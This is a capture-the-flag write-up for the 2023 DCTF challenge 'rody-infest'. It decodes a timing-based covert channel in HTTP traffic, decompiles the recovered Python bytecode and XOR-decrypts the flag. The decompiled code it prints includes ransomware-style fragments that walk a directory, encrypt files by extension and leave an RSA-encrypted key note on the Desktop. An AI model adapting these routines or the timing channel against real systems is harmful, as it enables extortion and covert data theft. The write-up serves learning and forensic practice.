# 2023 DCTF - rody-infest

We are provided with a `.pcap` file that contains a lot of HTTP requests towards `http://google.com`. In the HTTP payloads there was nothing that was standing out, but we did notice that the timing of the requests is very specific. At a certain point in time, the client issues several HTTP requests and then waits for about 3 seconds until it issues another round of HTTP requests.

The initial step was to extract the HTTP requests from the .pcap file via wireshark export to CSV. Here is the sample from the file:

```
$ head -n 10 packets.csv 
"No.","Time","Source","Destination","Protocol","Length","Total Length","Info"
"18","11.130150","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"32","11.155848","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"46","11.181318","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"60","14.207416","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"74","17.234859","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"88","17.260228","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"102","17.284121","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"116","20.311338","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
"130","23.337593","172.17.0.4","142.251.39.110","HTTP","140","126","GET / HTTP/1.1 "
```

The initial guess was that a no pause between requests is a 0 and a three-second pause is a 1.
We have used the `Time` column to determine whether 1's and 0's with the following python code inside python3 terminal:
```python3
with open('packets.csv', 'r') as fp:
    a = fp.read().splitlines()

c = [i.split(',')[1].split('.')[0].replace('"', '') for i in a[1:]]
quest = ''
for i in range(1, len(c)-1):
   quest += '0' if int(c[i+1])-int(c[i]) < 2 else '1' 
print(quest)
```

After converting the bits in CyberChef we obtain a Python3.6 bytecode which `uncompyle`s to:
```python
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64, os
wEfikA = 'CTF{fake_flag}'

def encrypt_fernet_key(self):
    with open('fernet_key.txt', 'rb') as (fk):
        fernet_key = fk.read()
    with open('fernet_key.txt', 'wb') as (f):
        self.public_key = RSA.import_key(open('public.pem').read())
        public_crypter = PKCS1_OAEP.new(self.public_key)
        enc_fernent_key = public_crypter.encrypt(fernet_key)
        f.write(enc_fernent_key)
    with open(f"{self.sysRoot}Desktop/EMAIL_ME.txt", 'wb') as (fa):
        fa.write(enc_fernent_key)
    self.key = enc_fernent_key
    self.crypter = None


def VBezmU(oNLeeO):
    fZBlDh = b'2z{-Keuzqx5z+680pqS+P>K#vTY01}'
    TchaLO = len(fZBlDh)
    return bytes(c ^ fZBlDh[i % TchaLO] for i, c in enumerate(oNLeeO))


def crypt_file(self, file_path, encrypted=False):
    with open(file_path, 'rb') as (f):
        data = f.read()
        if not encrypted:
            print(data)
            _data = self.crypter.encrypt(data)
            print('> File encrpyted')
            print(_data)
        else:
            _data = self.crypter.decrypt(data)
            print('> File decrpyted')
            print(_data)
    with open(file_path, 'wb') as (fp):
        fp.write(_data)


def UEGlZp(text):
    aIHieL = VBezmU(text.encode())
    UssbwP = base64.b64encode(aIHieL)
    return UssbwP


def crypt_system(self, encrypted=False):
    system = os.walk((self.localRoot), topdown=True)
    for root, dir, files in system:
        for file in files:
            file_path = os.path.join(root, file)
            if file.split('.')[-1] not in self.file_exts:
                pass
            else:
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


hNXQpO = UEGlZp(wEfikA)
Y0JF6SZwUb = 'OlQrMAoIJgIoAyZfPCAIEjQaKggpPDRIOl08DSUIMx0hJSoBK0shBigwDFUgIwsfPQEoDjoCKx4mITxCIiYDXysTEBY9MzkPNjM6QCoRCRA6OxFQJjIsRDU1LlI='
# okay decompiling solve.pyc
```

Since the challenge said:
```
Note: Use "keyword" (without quotes) for the keyword. You'll know where it fits once you find it.
```

We've used `keyword` as key and base64 encoded `Y0JF6SZwUb` variable as ciphertext:
```
>>> Y0JF6SZwUb = 'OlQrMAoIJgIoAyZfPCAIEjQaKggpPDRIOl08DSUIMx0hJSoBK0shBigwDFUgIwsfPQEoDjoCKx4mITxCIiYDXysTEBY9MzkPNjM6QCoRCRA6OxFQJjIsRDU1LlI='
>>> def VBezmU(oNLeeO):
...     fZBlDh = b'keyword'
...     TchaLO = len(fZBlDh)
...     return bytes(c ^ fZBlDh[i % TchaLO] for i, c in enumerate(oNLeeO))
... 
>>> from base64 import b64decode
>>> VBezmU(b64decode(Y0JF6SZwUb))
b'Q1RGezBiMzQ0NDcwMmEzMWQ1M2NiNmJjNWNjN2ViZTg0YTdmYjMwMmYzMDE5MTg4NjgyOWRjODU2NzliMTc4MWU3ZGJ9'
>>> b64decode(_)
b'CTF{0b3444702a31d53cb6bc5cc7ebe84a7fb302f30191886829dc85679b1781e7db}'
```
